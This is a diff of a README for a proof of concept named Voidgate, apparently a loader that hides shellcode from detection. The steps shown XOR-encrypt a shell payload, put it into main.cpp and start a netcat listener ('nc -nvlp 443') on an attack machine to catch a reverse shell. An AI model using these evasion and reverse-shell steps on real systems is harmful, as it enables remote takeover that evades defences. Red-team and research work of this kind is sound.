@@ -36,9 +36,9 @@ How to reproduce the POC:
 ```
 ./XorEncryptPayload.exe C:\Path\to\shell.asm
 ```
-* 3.) Update it inside the main.cpp of Voidgate project
+* 3.) Update the variable which contains the shellcode inside the main.cpp of Voidgate project
 * 4.) Ensure the xor key matches the encryptor and Voidgate project
-* 5.) Ensure your listener is waiting for the shellcode
+* 5.) Ensure your listener is waiting on the attack machine:
 ```
 nc -nvlp 443
 ```
